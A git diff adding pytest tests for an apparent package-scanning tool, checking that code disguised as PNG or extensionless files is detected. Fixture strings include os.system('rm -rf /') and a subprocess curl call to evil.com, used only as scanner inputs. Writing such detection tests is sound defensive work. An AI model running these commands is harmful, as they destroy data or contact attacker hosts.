@@ -51,6 +51,49 @@ class TestExtractArchive:
         assert result == {}
 
 
+class TestContentSniffingInArchive:
+    """Verify _extract_archive catches disguised files via content sniffing."""
+
+    @staticmethod
+    def _make_tar_gz(files: dict[str, str]) -> bytes:
+        """Create a tar.gz in memory with given {path: content} entries."""
+        import io as _io
+        import tarfile as _tf
+
+        buf = _io.BytesIO()
+        with _tf.open(fileobj=buf, mode="w:gz") as tar:
+            for path, content in files.items():
+                data = content.encode("utf-8")
+                info = _tf.TarInfo(name=path)
+                info.size = len(data)
+                tar.addfile(info, _io.BytesIO(data))
+        return buf.getvalue()
+
+    def test_python_disguised_as_png_is_extracted(self):
+        content = "#!/usr/bin/env python3\nimport os\nos.system('rm -rf /')\n"
+        archive = self._make_tar_gz({"pkg-1.0/logo.png": content})
+        result = _extract_archive(archive, "pkg.tar.gz")
+        assert "pkg-1.0/logo.png" in result
+
+    def test_extensionless_python_is_extracted(self):
+        content = "import subprocess\nsubprocess.call(['curl', 'evil.com'])\n"
+        archive = self._make_tar_gz({"pkg-1.0/run": content})
+        result = _extract_archive(archive, "pkg.tar.gz")
+        assert "pkg-1.0/run" in result
+
+    def test_genuine_binary_png_not_extracted(self):
+        content = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00"
+        archive = self._make_tar_gz({"pkg-1.0/real.png": content})
+        result = _extract_archive(archive, "pkg.tar.gz")
+        assert "pkg-1.0/real.png" not in result
+
+    def test_normal_py_file_still_extracted(self):
+        content = "print('hello')\n"
+        archive = self._make_tar_gz({"pkg-1.0/main.py": content})
+        result = _extract_archive(archive, "pkg.tar.gz")
+        assert "pkg-1.0/main.py" in result
+
+
 class _FakeResponse:
     def __init__(self, *, json_data=None, content: bytes = b""):
         self._json_data = json_data
@@ -478,3 +521,23 @@ class TestReadLocalSource:
         result = read_local_source(tmp_path)
         assert "# Title" not in result
         assert "code()" in result
+
+    def test_extensionless_script_is_read(self, tmp_path):
+        """Extensionless files with code content should be included."""
+        (tmp_path / "run").write_text("#!/usr/bin/env python3\nimport os\n")
+        result = read_local_source(tmp_path)
+        assert "import os" in result
+
+    def test_disguised_extension_is_read(self, tmp_path):
+        """Code in .png extension should be included in local scan."""
+        (tmp_path / "logo.png").write_text("import subprocess\nsubprocess.call(['evil'])\n")
+        result = read_local_source(tmp_path)
+        assert "subprocess" in result
+
+    def test_genuine_non_code_still_skipped(self, tmp_path):
+        """Plain text README.md should still be skipped."""
+        (tmp_path / "README.md").write_text("# Just a README\nNothing to see here.\n")
+        (tmp_path / "app.py").write_text("print('hello')")
+        result = read_local_source(tmp_path)
+        assert "Nothing to see here" not in result
+        assert "print('hello')" in result
